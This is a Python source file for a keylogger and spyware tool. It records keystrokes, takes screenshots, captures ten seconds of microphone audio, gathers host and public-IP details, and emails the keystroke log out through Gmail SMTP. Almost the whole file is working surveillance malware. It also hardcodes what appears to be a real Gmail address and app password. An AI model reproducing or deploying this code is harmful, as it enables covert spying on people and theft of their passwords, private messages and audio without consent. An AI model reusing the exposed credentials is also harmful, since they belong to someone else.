#Libraries 

from decimal import MIN_EMIN
import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#Code

keys_information = 'key_log.txt'
system_information = "sysinfo.txt"
email_address = "yajursharma1712@gmail.com    "
password = "ruvhqoqjapyzbcyn"
microphone_time = 10
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

toaddr = "your email"


file_path = 'your directory'
extend = "\\"

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()
    
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Log File'

    body = 'Body_of_the_mail'

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP_SSL('smtp.gmail.com', 465)

    s.starttls

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP")

        f.write('Processor: ' + (platform.processor()) + '\n')
        f.write('System: ' + platform.system() + ' ' + platform.version() + '\n')
        f.write('Machine: ' + platform.machine() + "\n")
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP: " + IPAddr + '\n')

computer_information()

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording =  sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)\

screenshot()

count = 0
keys = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open (file_path + extend + keys_information, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "") 
            if k.find("space") > 0:
                f.write('\n')
                f.close
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
